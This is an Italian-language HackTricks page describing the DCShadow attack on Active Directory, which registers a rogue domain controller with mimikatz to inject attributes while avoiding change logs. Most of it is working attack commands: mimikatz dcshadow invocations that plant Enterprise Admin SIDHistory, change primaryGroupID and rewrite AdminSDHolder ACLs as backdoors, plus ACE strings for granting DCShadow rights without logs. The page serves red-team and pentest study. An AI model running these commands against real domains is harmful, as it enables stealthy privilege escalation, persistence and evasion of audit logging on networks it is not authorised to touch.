<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>


# DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo utilizza per **inserire attributi** (SIDHistory, SPN...) sugli oggetti specificati **senza** lasciare alcun **log** riguardo alle **modifiche**. Hai bisogno dei privilegi DA e devi essere all'interno del **dominio radice**.\
Nota che se utilizzi dati errati, compariranno log piuttosto brutti.

Per eseguire l'attacco hai bisogno di 2 istanze di mimikatz. Una di esse avvierà i server RPC con privilegi di sistema (devi indicare qui le modifiche che desideri effettuare), e l'altra istanza verrà utilizzata per inserire i valori:

{% code title="mimikatz1 (server RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - Necessita di DA o simile" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Si noti che **`elevate::token`** non funzionerà nella sessione `mimikatz1` poiché eleva i privilegi del thread, ma è necessario elevare i **privilegi del processo**.\
È anche possibile selezionare un oggetto "LDAP": `/object:CN=Amministratore,CN=Utenti,DC=JEFFLAB,DC=local`

È possibile eseguire le modifiche da un DA o da un utente con queste autorizzazioni minime:

* Nell'**oggetto dominio**:
* _DS-Install-Replica_ (Aggiungi/Rimuovi replica nel dominio)
* _DS-Replication-Manage-Topology_ (Gestisci la topologia di replica)
* _DS-Replication-Synchronize_ (Sincronizzazione di replica)
* L'oggetto **Siti** (e i suoi figli) nel **contenitore Configurazione**:
* _CreateChild e DeleteChild_
* L'oggetto del **computer registrato come DC**:
* _WriteProperty_ (Non Write)
* L'**oggetto di destinazione**:
* _WriteProperty_ (Non Write)

È possibile utilizzare [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) per concedere questi privilegi a un utente non privilegiato (si noti che ciò lascerà alcuni log). Questo è molto più restrittivo rispetto ad avere privilegi DA.\
Ad esempio: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Ciò significa che l'username _**student1**_ quando effettua l'accesso alla macchina _**mcorp-student1**_ ha i permessi DCShadow sull'oggetto _**root1user**_.

## Utilizzo di DCShadow per creare backdoor

{% code title="Imposta Enterprise Admins in SIDHistory su un utente" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="Modifica PrimaryGroupID (aggiungi l'utente come membro di Domain Administrators)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="Modificare ntSecurityDescriptor di AdminSDHolder (assegnare il controllo totale a un utente)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Concedere le autorizzazioni DCShadow utilizzando DCShadow (nessun log di autorizzazioni modificate)

Dobbiamo aggiungere le seguenti ACE con l'SID dell'utente alla fine:

* Sull'oggetto del dominio:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Sull'oggetto del computer dell'attaccante: `(A;;WP;;;UserSID)`
* Sull'oggetto dell'utente di destinazione: `(A;;WP;;;UserSID)`
* Sull'oggetto dei siti nel contenitore di configurazione: `(A;CI;CCDC;;;UserSID)`

Per ottenere l'ACE corrente di un oggetto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Si noti che in questo caso è necessario apportare **diverse modifiche,** non solo una. Quindi, nella sessione **mimikatz1** (server RPC), utilizzare il parametro **`/stack` con ogni modifica** che si desidera apportare. In questo modo, sarà sufficiente eseguire **`/push`** una volta per eseguire tutte le modifiche bloccate nel server falso.



[**Ulteriori informazioni su DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
